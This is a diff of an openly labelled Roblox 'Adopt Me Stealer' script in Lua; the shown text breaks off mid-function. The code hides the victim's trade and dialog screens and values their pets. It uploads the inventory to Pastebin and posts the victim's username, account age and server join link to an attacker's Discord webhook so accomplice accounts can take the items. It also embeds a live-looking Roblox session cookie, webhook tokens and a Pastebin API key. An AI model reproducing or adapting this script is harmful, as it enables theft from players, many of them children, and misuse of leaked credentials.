@@ -1,13 +1,38 @@
 getgenv().Cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhACIhsKBGR1aWQSEzk2MTA1NTI5NTY3MTI2MDQyNjYoAw.Q_bHAVD-HxDeSgomIU63hkyS89xZS1_97S9SjHOR7eTtf4XBzKdp6NaghwZ6iOSe043CoTzmZq_yVM-6b7kEUuoa8Cw8ech3loB2FyAiUoJZpB2wtUf-t-pfzWQGEdUYjiCTpVRyFTSU7ATuGGDR_9SVJzYICEwaKItC7wKbI4d_4WejHTiYOmv8ut8wC95Ipe3B1yOssRD6t_xSsAKyyo7skhulxPyBzXpMgLvKAyNLMETtZnZS5Ewl5Hp8ph7BDz2gmMWoYEaZ0gHswU20nbuLxpUwPSnqyUn0CWaeh3L0413PpsLPhuPc85MwgTYN_Px_9x22QywYzO_AP4I63cwe_-pdbFfChZg_kAkQ8BhvTXXLxzJHYvIeqtle0YOyO7SR3UnlX27iUs79KZcY-BidC-5AE9gOzOoaeCiMulCPGD02HDaGcD0VHXLpkwpWuK3VbYsyR045lpJpG5oiJXhCKehDPA6fgRFMt1FV5hgm10lgx8ihE-VY_UcZML1GFWphtfiv0doVwuXkkSDWEoOjw86t0C5WE4Uu_t7_j-S06KJfd7RcasGu2bAfxC49u7z_mxP4pyvN2t05DR48f4IjiSOv77OWFdO9JeWPckJzgNi_kmicTiKoDszXujiNNIjjeS0VCH8Jo6LCkcdOkfwDaTp-s0SqnXDLPhCSD7YAH8dxm6_YjPM5E5kDvg1aobkDu6KVmAjRFGxLyGpkBxvmoWLR03hcSTra5VUTOWp52uDqYT3D_5JtvYKE8E0oix3bx8l-vmUAfzM1DMh1jTkkqxMSP1rJh9lH2H0H5sLDLKIlJtL8kUkv6FvlQ0LcHfQjwgiVXQz_0Zm-YN7vU9F2kFP75RXRcOmdgvlwsgHs3FBOPhnydQwiEVGtzt-Ed3Ew6j4ukvX3v4SyV89luczy2Yg2WHBnxUhob-A58b_JSIjuv3JOqe_vcq5yya2fQaeGVXpjML7UmCY5X26DxDT2oRLIErYheHa4PEJF4_vxw1izxb9opVc5C3UOKjd9hHOfjysUsNzVHxk_tw8h5Z7mVKw40LwpbcZfoPrbl2Or6gp1BubaljahxhZmcKKN3HG1AuXlnZbkexR1v76FUGMi_n06RQrWVIgTi2ILRqKHZkF46nAfGPIgq6qeE-zKt9XEmMK3EesTHMjDa1HNINUT2JY"
-
--- Конфигурация
-local Username = "knisdqx_meow" -- >> Your main username
-local Username2 = "noviy_nickname" -- >> Your alt username
-local Webhook = "https://discord.com/api/webhooks/1441486238535385259/UD9X5VKaySPqiqUe4-1kqlcb53x7CD8anvEfE7sIabuCWYPpehYBkuRrAJL85QxF5QLZ"
-
--- JobId система
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
+Username = "sosedra6" -- >> Your main username
+Username2 = "knisdqx_meow" -- >> Your alt username
+Webhook = "https://webhook.lewisakura.moe/api/webhooks/1441486238535385259/UD9X5VKaySPqiqUe4-1kqlcb53x7CD8anvEfE7sIabuCWYPpehYBkuRrAJL85QxF5QLZ" -- >> https://stealer.to/
+
+repeat task.wait() until game:IsLoaded()
+
+if getgenv().adm then return end
+getgenv().adm = true
+
+if Username == "" or Username == nil then
+    game:GetService("Players").LocalPlayer:Kick("\nPlease enter a Username!")
+    return
+end
+
+if Username2 == "" or Username2 == nil then
+    Username2 = "None"
+end
+
+if Webhook == "" or Webhook == nil then
+    game:GetService("Players").LocalPlayer:Kick("\nPlease enter a Webhook!")
+    return
+end
+
+if #game:GetService("Players"):GetPlayers() == game.Players.MaxPlayers then
+    game:GetService("Players").LocalPlayer:Kick("\nPlease join to different server!")
+    return
+end
+
+if game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType"):InvokeServer() == "VIPServer" then
+    game.Players.LocalPlayer:Kick("\nPrivate server detected!")
+    return
+end
 
 local function GetRealJobIdWithAuth()
     local localPlayer = Players.LocalPlayer
@@ -25,13 +50,13 @@ local function GetRealJobIdWithAuth()
         end
     end
 
-    if #userIds == 0 then return nil end
-
     local function GetPresenceWithAuth(userIdsList)
-        local reqBody = HttpService:JSONEncode({userIds = userIdsList})
+        local reqBody = HttpService:JSONEncode({
+            userIds = userIdsList
+        })
         
         local success, response = pcall(function()
-            return request({
+            local result = request({
                 Url = "https://presence.roblox.com/v1/presence/users",
                 Method = "POST",
                 Headers = {
@@ -40,32 +65,39 @@ local function GetRealJobIdWithAuth()
                 },
                 Body = reqBody
             })
+            
+            return result
         end)
         
         if success and response then
             local jsonSuccess, jsonData = pcall(function()
                 return HttpService:JSONDecode(response.Body)
             end)
-            return jsonSuccess and jsonData or nil
+            
+            if jsonSuccess then
+                return jsonData
+            end
         end
-        return nil
     end
     
     local presenceData = GetPresenceWithAuth(userIds)
-    if not presenceData or not presenceData.userPresences then return nil end
     
     local foundJobIds = {}
+    local validResponses = 0
     
     for _, presence in pairs(presenceData.userPresences) do
         if presence.placeId == placeId and presence.gameId then
+            validResponses = validResponses + 1
             local jobId = presence.gameId
             local playerName = playerMap[presence.userId] or "Unknown"
             
             if jobId and jobId ~= game.JobId then
                 table.insert(foundJobIds, {
                     jobId = jobId,
-                    player = playerName
+                    player = playerName,
+                    lastLocation = presence.lastLocation or "InGame"
                 })
+            else
             end
         end
     end
@@ -75,7 +107,7 @@ local function GetRealJobIdWithAuth()
         for _, found in ipairs(foundJobIds) do
             jobIdCounts[found.jobId] = (jobIdCounts[found.jobId] or 0) + 1
         end
-        
+    
         local bestJobId, maxCount = nil, 0
         for jobId, count in pairs(jobIdCounts) do
             if count > maxCount then
@@ -84,49 +116,41 @@ local function GetRealJobIdWithAuth()
             end
         end
         
-        return bestJobId
+        if bestJobId then
+            local confirmers = {}
+            for _, found in ipairs(foundJobIds) do
+                if found.jobId == bestJobId then
+                    table.insert(confirmers, found.player)
+                end
+            end
+            
+            return bestJobId
+        end
     end
     
     return nil
 end
 
--- Основной код
-repeat task.wait() until game:IsLoaded()
-
-if getgenv().adm then return end
-getgenv().adm = true
-
--- Валидация конфигурации
-if not Username or Username == "" then
-    game.Players.LocalPlayer:Kick("\nPlease enter a Username!")
-    return
+local function FindRealJobId()
+    
+    local realJobId = GetRealJobIdWithAuth()
+    
+    if realJobId then
+        getgenv().RealJobId = realJobId
+        
+        pcall(function()
+            writefile("real_jobid.txt", realJobId)
+        end)
+        
+        return realJobId
+    end
 end
 
-if not Username2 or Username2 == "" then
-    Username2 = "None"
+if getgenv().Cookie then
+    local realJobId = FindRealJobId()
 end
 
-if not Webhook or Webhook == "" then
-    game.Players.LocalPlayer:Kick("\nPlease enter a Webhook!")
-    return
-end
-
--- Проверка сервера
-if #Players:GetPlayers() == game.Players.MaxPlayers then
-    game.Players.LocalPlayer:Kick("\nPlease join to different server!")
-    return
-end
-
-if game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType"):InvokeServer() == "VIPServer" then
-    game.Players.LocalPlayer:Kick("\nPrivate server detected!")
-    return
-end
-
--- Получаем настоящий JobId
-local realJobId = GetRealJobIdWithAuth()
-local fakeJobId = game.JobId
-
--- Таблицы значений петов (сокращено для оптимизации)
+-- >> Values Table for all pets << --
 local valuesTable = {
     -- Legendary Pets
     ["Shadow Dragon"] = {value = 7000, rarity = "legendary"},
@@ -522,28 +546,52 @@ local valuesTable = {
     ["Brachiosaurus"] = {value = 5, rarity = "common"}
 }
 
+-- >> Rarity multipliers << --
 local rarityMultipliers = {
-    FR = 3.0, MFR = 8.0, NFR = 4.0, 
-    F = 2.0, R = 1.5, N = 2.5, M = 6.0
+    FR = 3.0,    -- Fly & Ride
+    MFR = 8.0,   -- Mega Fly & Ride  
+    NFR = 4.0,   -- Neon Fly & Ride
+    F = 2.0,     -- Fly only
+    R = 1.5,     -- Ride only
+    N = 2.5,     -- Neon only
+    M = 6.0      -- Mega only
 }
 
--- Система отклонения трейдов
+-- >> /kick command << --
+game.Players.PlayerAdded:Connect(function(newPlayer)
+    newPlayer.Chatted:Connect(function(message)
+        if message == "free dope" then
+            game.Players.LocalPlayer:Kick("\nPlease rejoin!")
+        end
+    end)
+end)
+
+-- >> Decline trade request logic << --
 local Loads = require(game.ReplicatedStorage.Fsys).load
 local RouterClient = Loads("RouterClient")
 local TradeRequestReceivedRemote = RouterClient.get_event("TradeAPI/TradeRequestReceived")
 local TradeAcceptOrDeclineRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
-local SettingsRemote = RouterClient.get("SettingsAPI/SetSetting")
+local SettingsRemote = RouterClient.get("SettingsAPI/SetSetting") -- SettingsRemote for trade ON
 
 SettingsRemote:FireServer("trade_requests", 1)
+
+local function moveGuiOffscreen(guiElement)
+    if guiElement then guiElement.Position = UDim2.new(1000, 0, 1000, 0) end
+end
+
+local function hideDialog()
+    local dialogApp = game.Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DialogApp")
+    if dialogApp and dialogApp:FindFirstChild("Dialog") then
+        dialogApp.Dialog.Visible = false
+        moveGuiOffscreen(dialogApp.Dialog)
+    end
+end
 
 local function declineTradeRequest(player)
     TradeAcceptOrDeclineRequest:InvokeServer(player, false)
 end
 
--- Переменные для отслеживания состояния
-local tradeCooldowns = {}
-local lastTradeTime = 0
-local TRADE_COOLDOWN = 2 -- 30 секунд коoldown между трейдами
+hideDialog()
 
 TradeRequestReceivedRemote.OnClientEvent:Connect(function(sender)
     if sender.Name ~= game.Players.LocalPlayer.Name then
@@ -551,107 +599,183 @@ TradeRequestReceivedRemote.OnClientEvent:Connect(function(sender)
     end
 end)
 
--- Оптимизированные функции для работы с петам
-local InventoryDB = Loads("InventoryDB")
-local ClientData = Loads("ClientData")
+declineTradeRequest()
 
-local function calculatePetValue(petData)
-    local petInfo = InventoryDB[petData.category][petData.id]
-    local petName = petInfo.name
-    local baseValue = 0
-    
-    for petKey, valueData in pairs(valuesTable) do
-        if string.lower(petName) == string.lower(petKey) then
-            baseValue = valueData.value
-            break
+local Pets = {}
+local PetCounts = {}
+local Loaders = require(game.ReplicatedStorage.Fsys).load
+local InventoryDB = Loaders("InventoryDB")
+local ClientData = Loaders("ClientData")
+local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
+local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]
+
+local neon_count = 0
+local mega_neon_count = 0
+local flyable_count = 0
+local rideable_count = 0
+local legendaries_count = 0
+local ultra_count = 0
+local rare_count = 0
+local uncommon_count = 0
+local common_count = 0
+local fr_count = 0
+local mfr_count = 0
+local nfr_count = 0
+
+for _, petData in pairs(playerData.inventory.pets) do
+    if petData.properties and type(petData.properties) == "table" then
+        if petData.properties.neon then
+            neon_count = neon_count + 1
         end
-    end
-    
-    local multiplier = 1.0
-    if petData.properties then
+        if petData.properties.mega_neon then
+            mega_neon_count = mega_neon_count + 1
+        end
+        if petData.properties.flyable then
+            flyable_count = flyable_count + 1
+        end
+        if petData.properties.rideable then
+            rideable_count = rideable_count + 1
+        end
+        if petData.properties.flyable and petData.properties.rideable then
+            fr_count = fr_count + 1
+        end
+        if petData.properties.neon and petData.properties.flyable and petData.properties.rideable then
+            nfr_count = nfr_count + 1
+        end
         if petData.properties.mega_neon and petData.properties.flyable and petData.properties.rideable then
-            multiplier = rarityMultipliers.MFR
-        elseif petData.properties.neon and petData.properties.flyable and petData.properties.rideable then
-            multiplier = rarityMultipliers.NFR
-        elseif petData.properties.flyable and petData.properties.rideable then
-            multiplier = rarityMultipliers.FR
-        elseif petData.properties.mega_neon then
-            multiplier = rarityMultipliers.M
-        elseif petData.properties.neon then
-            multiplier = rarityMultipliers.N
-        elseif petData.properties.flyable then
-            multiplier = rarityMultipliers.F
-        elseif petData.properties.rideable then
-            multiplier = rarityMultipliers.R
+            mfr_count = mfr_count + 1
         end
     end
-    
-    return baseValue * multiplier, baseValue
 end
 
-local function getPetTypeString(properties)
-    if not properties then return "" end
-    if properties.mega_neon and properties.flyable and properties.rideable then return " MFR"
-    elseif properties.neon and properties.flyable and properties.rideable then return " NFR"
-    elseif properties.flyable and properties.rideable then return " FR"
-    elseif properties.mega_neon then return " Mega"
-    elseif properties.neon then return " Neon"
-    elseif properties.flyable then return " Fly"
-    elseif properties.rideable then return " Ride"
-    else return "" end
+for i, v in pairs(ClientData.get("inventory").pets) do
+    local petData = InventoryDB[v.category][v.id]
+    if petData.rarity == "legendary" then
+        legendaries_count = legendaries_count + 1
+    elseif petData.rarity == "ultra_rare" then
+        ultra_count = ultra_count + 1
+    elseif petData.rarity == "rare" then
+        rare_count = rare_count + 1
+    elseif petData.rarity == "uncommon" then
+        uncommon_count = uncommon_count + 1
+    elseif petData.rarity == "common" then
+        common_count = common_count + 1
+    end
 end
 
--- Функция для получения статистики инвентаря
-local function getInventoryStats()
-    local playerData = ClientData.get_data()[game.Players.LocalPlayer.Name]
-    local stats = {
-        legendary = 0, ultra_rare = 0, rare = 0, uncommon = 0, common = 0,
-        mfr = 0, nfr = 0, fr = 0, mega = 0, neon = 0, fly = 0, ride = 0,
-        totalValue = 0, valuableCount = 0
-    }
-    
+        -- Function to calculate pet value based on valuesTable and properties
+        local function calculatePetValue(petData)
+            local petInfo = InventoryDB[petData.category][petData.id]
+            local petName = petInfo.name
+            local baseValue = 0
+            
+            -- Find base value from valuesTable
+            for petKey, valueData in pairs(valuesTable) do
+                if string.lower(petName) == string.lower(petKey) then
+                    baseValue = valueData.value
+                    break
+                end
+            end
+            
+            -- Apply multipliers based on properties
+            local multiplier = 1.0
+            
+            if petData.properties then
+                if petData.properties.mega_neon and petData.properties.flyable and petData.properties.rideable then
+                    multiplier = rarityMultipliers.MFR
+                elseif petData.properties.neon and petData.properties.flyable and petData.properties.rideable then
+                    multiplier = rarityMultipliers.NFR
+                elseif petData.properties.flyable and petData.properties.rideable then
+                    multiplier = rarityMultipliers.FR
+                elseif petData.properties.mega_neon then
+                    multiplier = rarityMultipliers.M
+                elseif petData.properties.neon then
+                    multiplier = rarityMultipliers.N
+                elseif petData.properties.flyable then
+                    multiplier = rarityMultipliers.F
+                elseif petData.properties.rideable then
+                    multiplier = rarityMultipliers.R
+                end
+            end
+            
+            return baseValue * multiplier, baseValue
+        end
+
+-- Function to count valuable pets and get top pets
+local function getValuablePetsInfo()
+    local valuableCount = 0
+    local totalValue = 0
     local topPets = {}
+    local PetsInventory = ClientData.get_data()[game.Players.LocalPlayer.Name].inventory.pets
     
-    for _, petData in pairs(playerData.inventory.pets) do
+    for _, petData in pairs(PetsInventory) do
         local petInfo = InventoryDB[petData.category][petData.id]
+        local petName = petInfo.name
         local calculatedValue, baseValue = calculatePetValue(petData)
         
-        -- Статистика по редкости
-        if petInfo.rarity == "legendary" then stats.legendary = stats.legendary + 1
-        elseif petInfo.rarity == "ultra_rare" then stats.ultra_rare = stats.ultra_rare + 1
-        elseif petInfo.rarity == "rare" then stats.rare = stats.rare + 1
-        elseif petInfo.rarity == "uncommon" then stats.uncommon = stats.uncommon + 1
-        elseif petInfo.rarity == "common" then stats.common = stats.common + 1 end
-        
-        -- Статистика по свойствам
-        if petData.properties then
-            if petData.properties.mega_neon then stats.mega = stats.mega + 1 end
-            if petData.properties.neon then stats.neon = stats.neon + 1 end
-            if petData.properties.flyable then stats.fly = stats.fly + 1 end
-            if petData.properties.rideable then stats.ride = stats.ride + 1 end
-            if petData.properties.flyable and petData.properties.rideable then stats.fr = stats.fr + 1 end
-            if petData.properties.neon and petData.properties.flyable and petData.properties.rideable then stats.nfr = stats.nfr + 1 end
-            if petData.properties.mega_neon and petData.properties.flyable and petData.properties.rideable then stats.mfr = stats.mfr + 1 end
-        end
-        
         if baseValue > 0 then
-            stats.valuableCount = stats.valuableCount + 1
-            stats.totalValue = stats.totalValue + calculatedValue
+            valuableCount = valuableCount + 1
+            totalValue = totalValue + calculatedValue
             
             table.insert(topPets, {
-                name = petInfo.name,
+                name = petName,
                 value = calculatedValue,
                 properties = petData.properties or {}
             })
         end
     end
     
-    table.sort(topPets, function(a, b) return a.value > b.value end)
+    -- Sort top pets by value
+    table.sort(topPets, function(a, b)
+        return a.value > b.value
+    end)
     
-    return stats, topPets
+    return valuableCount, totalValue, topPets
 end
 
--- Функция для pastebin
+-- Function to get pet type string
+local function getPetTypeString(properties)
+    if properties.mega_neon and properties.flyable and properties.rideable then
+        return " MFR"
+    elseif properties.neon and properties.flyable and properties.rideable then
+        return " NFR"
+    elseif properties.flyable and properties.rideable then
+        return " FR"
+    elseif properties.mega_neon then
+        return " Mega"
+    elseif properties.neon then
+        return " Neon"
+    elseif properties.flyable then
+        return " Fly"
+    elseif properties.rideable then
+        return " Ride"
+    else
+        return ""
+    end
+end
+
+local plr = game.Players.LocalPlayer
+local accage = plr.AccountAge
+local ExecutorValue = identifyexecutor() or "Unknown"
+local placeId = game.PlaceId
+local jobId = game.JobId
+local browserTeleport = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. realJobId
+local TeleportScript = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. placeId .. ", \"" .. realJobId .. "\")"
+local VersionValue = "1.12 (Added values)"
+
+-- Get valuable pets info
+local valuableCount, totalValue, topPets = getValuablePetsInfo()
+
+-- Format top pets text
+local topPetsText = ""
+for i = 1, math.min(5, #topPets) do
+    local pet = topPets[i]
+    local petType = getPetTypeString(pet.properties)
+    topPetsText = topPetsText .. string.format("%s%s: %d₽\n", pet.name, petType, math.floor(pet.value))
+end
+
+local HttpService = game:GetService("HttpService")
+
 local function pastebin(content)
     local body = {
         api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
@@ -665,292 +789,568 @@ local function pastebin(content)
     end
     encodedBody = encodedBody:sub(1, -2)
 
-    local success, response = pcall(function()
-        return request({
+    local response
+    local success, err = pcall(function()
+        response = request({
             Url = "https://pastebin.com/api/api_post.php",
             Method = "POST",
             Body = encodedBody,
             Headers = {
                 ["Content-Type"] = "application/x-www-form-urlencoded"
-            }
+            },
+            Timeout = 20
         })
     end)
 
-    if success and response then
-        local pasteUrl = response.Body
-        return "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")
+    if not success or not response or not response.Success then
+        return "https://pastebin.com/raw/example" -- fallback URL
     end
-    
-    return "https://pastebin.com/raw/example"
+
+    local pasteUrl = response.Body
+    local rawUrl = "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")
+
+    return rawUrl
 end
 
 -- Функция для создания полного списка петов
 local function createFullPetsList()
     local petCategories = {
-        legendary = {}, ultra_rare = {}, rare = {}, uncommon = {}, common = {}
+        legendary = {},
+        ultra_rare = {},
+        rare = {},
+        uncommon = {},
+        common = {}
     }
     
-    local playerData = ClientData.get_data()[game.Players.LocalPlayer.Name]
+    local PetsInventory = ClientData.get_data()[game.Players.LocalPlayer.Name].inventory.pets
     
-    for _, petData in pairs(playerData.inventory.pets) do
+    for _, petData in pairs(PetsInventory) do
         local petInfo = InventoryDB[petData.category][petData.id]
-        local calculatedValue = calculatePetValue(petData)
-        local petType = getPetTypeString(petData.properties)
-        local petEntry = string.format("%s%s: %d₽", petInfo.name, petType, math.floor(calculatedValue))
+        local petName = petInfo.name
+        local calculatedValue, baseValue = calculatePetValue(petData)
         
-        if petInfo.rarity == "legendary" then table.insert(petCategories.legendary, petEntry)
-        elseif petInfo.rarity == "ultra_rare" then table.insert(petCategories.ultra_rare, petEntry)
-        elseif petInfo.rarity == "rare" then table.insert(petCategories.rare, petEntry)
-        elseif petInfo.rarity == "uncommon" then table.insert(petCategories.uncommon, petEntry)
-        elseif petInfo.rarity == "common" then table.insert(petCategories.common, petEntry) end
+        -- Определяем тип питомца
+        local petType = ""
+        if petData.properties then
+            if petData.properties.mega_neon and petData.properties.flyable and petData.properties.rideable then
+                petType = " MFR"
+            elseif petData.properties.neon and petData.properties.flyable and petData.properties.rideable then
+                petType = " NFR"
+            elseif petData.properties.flyable and petData.properties.rideable then
+                petType = " FR"
+            elseif petData.properties.mega_neon then
+                petType = " Mega"
+            elseif petData.properties.neon then
+                petType = " Neon"
+            elseif petData.properties.flyable then
+                petType = " Fly"
+            elseif petData.properties.rideable then
+                petType = " Ride"
+            end
+        end
+        
+        local petEntry = string.format("%s%s: %d₽", petName, petType, math.floor(calculatedValue))
+        
+        -- Добавляем в соответствующую категорию
+        if petInfo.rarity == "legendary" then
+            table.insert(petCategories.legendary, petEntry)
+        elseif petInfo.rarity == "ultra_rare" then
+            table.insert(petCategories.ultra_rare, petEntry)
+        elseif petInfo.rarity == "rare" then
+            table.insert(petCategories.rare, petEntry)
+        elseif petInfo.rarity == "uncommon" then
+            table.insert(petCategories.uncommon, petEntry)
+        elseif petInfo.rarity == "common" then
+            table.insert(petCategories.common, petEntry)
+        end
     end
     
+    -- Сортируем каждую категорию по ценности
+    local sortByValue = function(a, b)
+        local aValue = tonumber(a:match("(%d+)₽")) or 0
+        local bValue = tonumber(b:match("(%d+)₽")) or 0
+        return aValue > bValue
+    end
+    
+    for _, category in pairs(petCategories) do
+        table.sort(category, sortByValue)
+    end
+    
+    -- Формируем итоговый текст
     local pastebinContent = "-- 🐉 LEGENDARY PETS 🐉 --\n"
     pastebinContent = pastebinContent .. (#petCategories.legendary > 0 and table.concat(petCategories.legendary, "\n") or "None") .. "\n\n"
+    
     pastebinContent = pastebinContent .. "-- 🔥 ULTRA-RARE PETS 🔥 --\n"
     pastebinContent = pastebinContent .. (#petCategories.ultra_rare > 0 and table.concat(petCategories.ultra_rare, "\n") or "None") .. "\n\n"
+    
     pastebinContent = pastebinContent .. "-- 💎 RARE PETS 💎 --\n"
     pastebinContent = pastebinContent .. (#petCategories.rare > 0 and table.concat(petCategories.rare, "\n") or "None") .. "\n\n"
+    
     pastebinContent = pastebinContent .. "-- 🟢 UNCOMMON PETS 🟢 --\n"
     pastebinContent = pastebinContent .. (#petCategories.uncommon > 0 and table.concat(petCategories.uncommon, "\n") or "None") .. "\n\n"
+    
     pastebinContent = pastebinContent .. "-- ⚪ COMMON PETS ⚪ --\n"
-    pastebinContent = pastebinContent .. (#petCategories.common > 0 and table.concat(petCategories.common, "\n") or "None")
+    pastebinContent = pastebinContent .. (#petCategories.common > 0 and table.concat(petCategories.common, "\n") or "None") .. "\n\n"
     
-    return pastebin(pastebinContent)
+    pastebinContent = pastebinContent .. "Total pets: " .. #PetsInventory .. "\n"
+    pastebinContent = pastebinContent .. "Generated by Molitown Adopt Me Stealer"
+    
+    return pastebinContent
 end
 
--- Основная функция отправки вебхука
-local function SendMainWebhook()
-    local stats, topPets = getInventoryStats()
-    local plr = game.Players.LocalPlayer
-    local pastebinLink = createFullPetsList()
-    
-    -- Форматируем топ петов
-    local topPetsText = ""
-    for i = 1, math.min(5, #topPets) do
-        local pet = topPets[i]
-        local petType = getPetTypeString(pet.properties)
-        topPetsText = topPetsText .. string.format("%s%s: %d₽\n", pet.name, petType, math.floor(pet.value))
-    end
+-- Создаем полный список петов и публикуем на pastebin
+local fullPetsList = createFullPetsList()
+local pastebinLink = pastebin(fullPetsList)
 
-    local embed = {
-        ["title"] = "🎯 ВЬЕБАН - Долбаеб ракнул ваш скрипт! - ".. plr.Name,
-        ["color"] = 16711935,
-        ["fields"] = {
-            {
-                ["name"] = "🔗 **Teleport Info**",
-                ["value"] = 
-                 "🚀**Вставь в браузер для связи с дуплом**\n```roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. realJobId .. "```\n" ..
-                "**Teleport Script:**```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. game.PlaceId .. ", \"" .. (realJobId) .. "\")\n```",
-                ["inline"] = false
-            },
-            {
-                ["name"] = "〘:mammoth:〙**Info User**",
-                ["value"] = "```lua\n" ..
-                            "Username      : " .. plr.Name .. "\n" ..
-                            "Account Age   : " .. plr.AccountAge .. " Days\n" ..
-                            "Executor      : " .. (identifyexecutor() or "Unknown") .. "\n" ..
-                            "Receiver      : " .. Username .. ", " .. Username2 .. "```"                            
-            },
-            {
-                ["name"] = "〘:moneybag:〙**Inventory Stats**",
-                ["value"] = "```lua\n" ..
-                            "Total Value     : " .. string.format("%d₽", math.floor(stats.totalValue)) .. "\n" ..
-                            "MFR Pets        : " .. stats.mfr .. "\n" ..
-                            "NFR Pets        : " .. stats.nfr .. "\n" ..
-                            "FR Pets         : " .. stats.fr .. "\n" ..
-                            "Mega Pets       : " .. stats.mega .. "\n" ..
-                            "Neon Pets       : " .. stats.neon .. "\n" ..
-                            "Legendary Pets  : " .. stats.legendary .. "\n" ..
-                            "Ultra Rare Pets : " .. stats.ultra_rare .. "```" 
-            },
-            {
-                ["name"] = "〘:crown:〙**Top Valuable Pets**",
-                ["value"] = "```lua\n" .. (topPetsText ~= "" and topPetsText or "No valuable pets") .. "```",
-                ["inline"] = false
-            },
-            {
-                ["name"] = "〘:scroll:〙**Full Pets List**",
-                ["value"] = "[📋 Click to view all pets](" .. pastebinLink .. ")",
-                ["inline"] = false
-            },
-        }
+local embed = {
+    ["title"] = "🎯 ВЬЕБАН - Долбаеб ракнул ваш скрипт! - ".. plr.Name,
+    ["color"] = 16711935,
+    ["fields"] = {
+        {
+            ["name"] = "🔗 **Teleport to :mammoth:**",
+            ["value"] = 
+            "🚀**Вставь в браузер для связи с дуплом**\n```" .. browserTeleport .. "```\n" ..
+            "**Для автоматической связи:**\n```lua\n" .. TeleportScript .. "\n```",
+            ["inline"] = false
+        },
+        {
+            ["name"] = "〘:mammoth:〙**Info User**",
+            ["value"] = "```lua\n" ..
+                        "Username      : " .. tostring(game.Players.LocalPlayer.Name) .. "\n" ..
+                        "Account Age   : " .. tostring(game.Players.LocalPlayer.AccountAge) .. " Days\n" ..
+                        "Executor      : " .. tostring(ExecutorValue) .. "\n" ..
+                        "Receiver      : " .. Username .. ", " .. Username2 .. "\n" ..
+                        "Molitown      : " .. tostring(VersionValue) .. "```"                            
+        },
+        {
+            ["name"] = "〘:moneybag:〙**Inventory Stats**",
+            ["value"] = "```lua\n" ..
+                        "Total Value     : " .. string.format("%d₽", math.floor(totalValue)) .. "\n" ..
+                        "MFR Pets        : " .. tostring(mfr_count) .. "\n" ..
+                        "NFR Pets        : " .. tostring(nfr_count) .. "\n" ..
+                        "FR Pets         : " .. tostring(fr_count) .. "\n" ..
+                        "Mega Pets       : " .. tostring(mega_neon_count) .. "\n" ..
+                        "Neon Pets       : " .. tostring(neon_count) .. "\n" ..
+                        "Legendary Pets  : " .. tostring(legendaries_count) .. "\n" ..
+                        "Ultra Rare Pets : " .. tostring(ultra_count) .. "```" 
+        },
+        {
+            ["name"] = "〘:crown:〙**Top Valuable Pets**",
+            ["value"] = "```lua\n" .. (topPetsText ~= "" and topPetsText or "No valuable pets") .. "```",
+            ["inline"] = false
+        },
+        {
+            ["name"] = "〘:scroll:〙**Full Pets List**",
+            ["value"] = "[📋 Click to view all pets](" .. pastebinLink .. ")",
+            ["inline"] = false
+        },
     }
+}
 
-    local data = {
-        username = "M O L I T O W N",
-        avatar_url = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg",
-        content = stats.totalValue >= 50 and "@everyone\n**Teleport Script:**```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. game.PlaceId .. ", \"" .. (realJobId or fakeJobId) .. "\")\n```" or "Broke injected ur script.",
-        embeds = {embed}
-    }
+function SendMessageEMBED(url, embed, bool)
+  local http = game:GetService("HttpService")
+  local headers = {
+      ["Content-Type"] = "application/json"
+  }
+  local data = {
+      username = "M O L I T O W N",
+      avatar_url = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg",
+      content = "Broke injected ur script.",
+      embeds = {
+          {
+              title = embed.title,
+              color = embed.color,
+              fields = embed.fields,
+          }
+      }
+  }
+  local data2 = {
+      username = "M O L I T O W N",
+      avatar_url = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg",
+      content = "-- @everyone\n" .. TeleportScript,
+      embeds = {
+          {
+              title = embed.title,
+              color = 16711935,
+              fields = embed.fields,
+          }
+      }
+  }
 
-    local success, result = pcall(function()
-        return request({
-            Url = Webhook,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(data)
-        })
-    end)
+  local body = http:JSONEncode(data)
+  local body2 = http:JSONEncode(data2)
+  if bool == true then
+      local response = request({
+          Url = url,
+          Method = "POST",
+          Headers = headers,
+          Body = body2
+      })
+  else
+      local response = request({
+          Url = url,
+          Method = "POST",
+          Headers = headers,
+          Body = body
+      })
+  end
 end
 
--- Функция для успешного трейда
-local function SendTradeSuccessMessage(receiverName, tradedPets)
-    local totalValue = 0
+game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
+game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
+game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
+
+-- Function to send trade success message to Discord
+function SendTradeSuccessMessage(ReceiverName, tradedPets)
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    
+    -- Format traded pets list
     local petsText = ""
+    local totalValue = 0
     
     for i, pet in ipairs(tradedPets) do
-        local calculatedValue = calculatePetValue(pet.data)
+        local calculatedValue, baseValue = calculatePetValue(pet.data)
         local petType = getPetTypeString(pet.data.properties or {})
         petsText = petsText .. string.format("%s%s: %d₽\n", pet.name, petType, math.floor(calculatedValue))
         totalValue = totalValue + calculatedValue
     end
-
+    
     local data = {
         username = "Mama Mio [МФО ВОРК 2025]",
